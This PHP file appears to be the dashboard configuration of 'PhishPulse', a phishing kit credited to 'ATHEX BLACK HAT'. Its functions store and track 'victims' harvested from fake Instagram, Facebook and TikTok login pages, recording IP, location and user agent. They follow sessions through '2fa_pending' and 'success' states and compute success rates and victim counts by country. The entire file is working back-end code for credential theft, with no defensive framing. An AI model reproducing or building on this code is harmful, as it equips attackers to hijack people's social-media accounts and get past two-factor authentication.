<?php
/**
 * PhishPulse - Dashboard Configuration
 * Version: 1.0
 * Author: ATHEX BLACK HAT
 */

// Anti-theft check
$author_check = 'ATHEX BLACK HAT';
if (!isset($author_check)) {
    die("Just changing code can't make you a programmer. Learn and create your own!");
}

// Session start
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Dashboard settings
define('DASHBOARD_TITLE', 'PhishPulse Dashboard');
define('DASHBOARD_VERSION', '1.0');
define('AUTHOR', 'ATHEX BLACK HAT');
define('TOOL_NAME', 'PhishPulse');
define('DEFAULT_PASSWORD', 'admin123'); // Change this!
define('REFRESH_INTERVAL', 2000); // milliseconds

// Data file paths
define('DATA_DIR', __DIR__ . '/../data/');
define('VICTIMS_FILE', DATA_DIR . 'victims.json');
define('VISITORS_FILE', DATA_DIR . 'visitors.json');
define('SESSIONS_FILE', DATA_DIR . 'sessions.json');
define('SETTINGS_FILE', DATA_DIR . 'settings.json');

// Timezone
date_default_timezone_set('Asia/Karachi');

// Create data directory if not exists
if (!file_exists(DATA_DIR)) {
    mkdir(DATA_DIR, 0755, true);
}

// Initialize data files if not exist
if (!file_exists(VICTIMS_FILE)) {
    file_put_contents(VICTIMS_FILE, json_encode([]));
}

if (!file_exists(VISITORS_FILE)) {
    file_put_contents(VISITORS_FILE, json_encode([]));
}

if (!file_exists(SESSIONS_FILE)) {
    file_put_contents(SESSIONS_FILE, json_encode([]));
}

// Helper: Read JSON file
function read_json($file) {
    if (!file_exists($file)) {
        return [];
    }
    $data = file_get_contents($file);
    $decoded = json_decode($data, true);
    return is_array($decoded) ? $decoded : [];
}

// Helper: Write JSON file
function write_json($file, $data) {
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}

// Helper: Add victim to JSON
function add_victim($victim_data) {
    $victims = read_json(VICTIMS_FILE);
    
    // Generate ID if not present
    if (!isset($victim_data['id'])) {
        $victim_data['id'] = count($victims) + 1;
    }
    
    // Add timestamp if not present
    if (!isset($victim_data['timestamp'])) {
        $victim_data['timestamp'] = date('Y-m-d H:i:s');
    }
    
    // Add to beginning (newest first)
    array_unshift($victims, $victim_data);
    
    // Keep only last 1000 records
    if (count($victims) > 1000) {
        $victims = array_slice($victims, 0, 1000);
    }
    
    write_json(VICTIMS_FILE, $victims);
    
    // Also update sessions
    update_session($victim_data);
}

// Helper: Add visitor
function add_visitor($visitor_data) {
    $visitors = read_json(VISITORS_FILE);
    
    if (!isset($visitor_data['id'])) {
        $visitor_data['id'] = count($visitors) + 1;
    }
    
    if (!isset($visitor_data['timestamp'])) {
        $visitor_data['timestamp'] = date('Y-m-d H:i:s');
    }
    
    array_unshift($visitors, $visitor_data);
    
    if (count($visitors) > 500) {
        $visitors = array_slice($visitors, 0, 500);
    }
    
    write_json(VISITORS_FILE, $visitors);
}

// Helper: Update session
function update_session($victim_data) {
    $sessions = read_json(SESSIONS_FILE);
    $session_id = $victim_data['session_id'] ?? null;
    
    if (!$session_id) return;
    
    // Find existing session or create new
    $found = false;
    foreach ($sessions as &$session) {
        if ($session['session_id'] === $session_id) {
            $session['attempts'][] = $victim_data;
            $session['last_activity'] = date('Y-m-d H:i:s');
            $session['total_attempts'] = count($session['attempts']);
            
            if ($victim_data['status'] === 'success') {
                $session['status'] = 'completed';
                $session['final_status'] = 'success';
            } elseif ($victim_data['status'] === '2fa_pending') {
                $session['status'] = '2fa_pending';
            }
            
            $found = true;
            break;
        }
    }
    unset($session);
    
    if (!$found) {
        $sessions[] = [
            'session_id' => $session_id,
            'platform' => $victim_data['platform'] ?? 'unknown',
            'ip_address' => $victim_data['device']['ip_address'] ?? 'unknown',
            'country' => $victim_data['device']['country'] ?? 'Unknown',
            'city' => $victim_data['device']['city'] ?? 'Unknown',
            'user_agent' => $victim_data['device']['user_agent'] ?? 'Unknown',
            'start_time' => date('Y-m-d H:i:s'),
            'last_activity' => date('Y-m-d H:i:s'),
            'attempts' => [$victim_data],
            'total_attempts' => 1,
            'status' => $victim_data['status'] === 'success' ? 'completed' : $victim_data['status'],
            'final_status' => $victim_data['status'] === 'success' ? 'success' : null,
        ];
    }
    
    write_json(SESSIONS_FILE, $sessions);
}

// Helper: Get statistics
function get_stats() {
    $victims = read_json(VICTIMS_FILE);
    $sessions = read_json(SESSIONS_FILE);
    $visitors = read_json(VISITORS_FILE);
    
    $stats = [
        'total_visitors' => count($visitors),
        'total_victims' => count($victims),
        'total_sessions' => count($sessions),
        'active_sessions' => 0,
        'success_count' => 0,
        'failed_count' => 0,
        '2fa_pending_count' => 0,
        'instagram_count' => 0,
        'facebook_count' => 0,
        'tiktok_count' => 0,
        'countries' => [],
        'today_count' => 0,
        'success_rate' => 0,
    ];
    
    $today = date('Y-m-d');
    
    foreach ($sessions as $session) {
        if ($session['status'] === 'active' || $session['status'] === '2fa_pending') {
            $stats['active_sessions']++;
        }
    }
    
    foreach ($victims as $victim) {
        // Status counts
        $status = $victim['status'] ?? 'unknown';
        if ($status === 'success') $stats['success_count']++;
        elseif ($status === 'failed') $stats['failed_count']++;
        elseif ($status === '2fa_pending') $stats['2fa_pending_count']++;
        
        // Platform counts
        $platform = $victim['platform'] ?? 'unknown';
        if ($platform === 'instagram') $stats['instagram_count']++;
        elseif ($platform === 'facebook') $stats['facebook_count']++;
        elseif ($platform === 'tiktok') $stats['tiktok_count']++;
        
        // Country counts
        $country = $victim['device']['country'] ?? 'Unknown';
        if (!isset($stats['countries'][$country])) {
            $stats['countries'][$country] = 0;
        }
        $stats['countries'][$country]++;
        
        // Today count
        $victim_date = substr($victim['timestamp'] ?? '', 0, 10);
        if ($victim_date === $today) {
            $stats['today_count']++;
        }
    }
    
    // Success rate
    $total_attempts = $stats['success_count'] + $stats['failed_count'];
    if ($total_attempts > 0) {
        $stats['success_rate'] = round(($stats['success_count'] / $total_attempts) * 100, 1);
    }
    
    // Sort countries
    arsort($stats['countries']);
    $stats['countries'] = array_slice($stats['countries'], 0, 10);
    
    return $stats;
}

// NOTE: get_country_flag() function is in includes/functions.php
// This avoids duplicate function declaration error
?>